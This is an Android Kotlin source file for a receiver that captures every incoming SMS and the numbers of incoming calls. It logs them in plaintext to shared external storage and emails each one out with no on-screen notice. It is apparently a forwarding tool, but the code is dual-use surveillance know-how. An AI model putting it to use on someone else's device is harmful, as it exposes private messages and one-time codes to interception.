package com.example.oo__h__oo.deliverer.receiver

import android.content.Intent
import android.content.BroadcastReceiver
import android.content.Context
import android.provider.Telephony.Sms.Intents.SMS_RECEIVED_ACTION
import android.telephony.SmsMessage
import android.widget.Toast
import java.io.BufferedWriter
import java.io.File
import java.io.FileWriter
import com.example.oo__h__oo.deliverer.manager.EmailSender
import com.example.oo__h__oo.deliverer.manager.Message
import java.text.SimpleDateFormat
import java.util.*
import android.telephony.TelephonyManager




class MyReceiver : BroadcastReceiver() {
    val PHONE_STATE = "android.intent.action.PHONE_STATE"
    val RINGING = "RINGING"

    override fun onReceive(context: Context, intent: Intent) {
        try {
            if (intent.action != null) {
                if (intent.action == SMS_RECEIVED_ACTION) {
                    val message = getMessageFromIntent(intent)
                    val dateFormat = SimpleDateFormat("yyyy-MM-dd")
                    writeAllText("${dateFormat.format(message.date)}.txt",message.address + ": " + message.body)
//                Toast.makeText(context, message.address + ": " + message.body, Toast.LENGTH_LONG).show();
                    Thread(Runnable {
                        EmailSender().sendEmail(this,message)
                    }).start()
                }else if (intent.action == PHONE_STATE){
                    val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
                    if (state == RINGING){
                        val phoneNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER)
                        val message = Message(phoneNumber,phoneNumber, state, Date(), Message.MessageType.Phone, Message.MessagerType.Receive)
//                    Toast.makeText(context, message.address + ": " + message.body, Toast.LENGTH_LONG).show();
                        val dateFormat = SimpleDateFormat("yyyy-MM-dd")
                        writeAllText("${dateFormat.format(message.date)}.txt",message.address + ": " + message.body)
                        Thread(Runnable {
                            EmailSender().sendEmail(this,message)
                        }).start()
                    }

                }
            }
        }catch (e:Exception){
            val dateFormat = SimpleDateFormat("yyyy-MM-dd")
            writeAllText("${dateFormat.format(Date())}.txt",e.message.toString())
        }

    }

    private val DIR_NAME = "/Deliver"
    private lateinit var dataDir: File

    fun writeAllText(path: String, res: String) {
        try {
            dataDir = File(
                    android.os.Environment.getExternalStorageDirectory(),
                    DIR_NAME)
            if (!dataDir.exists()) {
                dataDir.mkdirs()
            }
            val writename = File(dataDir, path)
            if (!writename.exists() || !writename.canWrite()){
                writename.createNewFile()
            }
            val out = BufferedWriter(FileWriter(writename, true))
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
            out.write(dateFormat.format(Date()) + " : " + res + "\r\n")
            out.flush()
            out.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }

    }
    companion object {
        /**
         *
         * Read the PDUs out of an [.SMS_RECEIVED_ACTION] or a
         * [.DATA_SMS_RECEIVED_ACTION] intent.
         *
         * @param intent
         * the intent to read from
         * @return an array of SmsMessages for the PDUs
         */
        fun getMessageFromIntent(intent: Intent): Message {
            val pdus = intent.extras.get("pdus") as Array<*>
            var body = ""
            var phoneNumber = ""
            for (pdu in pdus) {
                //封装短信参数的对象
                @Suppress("DEPRECATION")
                val sms = SmsMessage.createFromPdu(pdu as ByteArray)
                phoneNumber = sms.originatingAddress
                body += sms.messageBody
            }
            val type = Message.MessagerType.Receive
            return Message(phoneNumber, phoneNumber, body, Date(), Message.MessageType.Messages, type)
        }
    }
}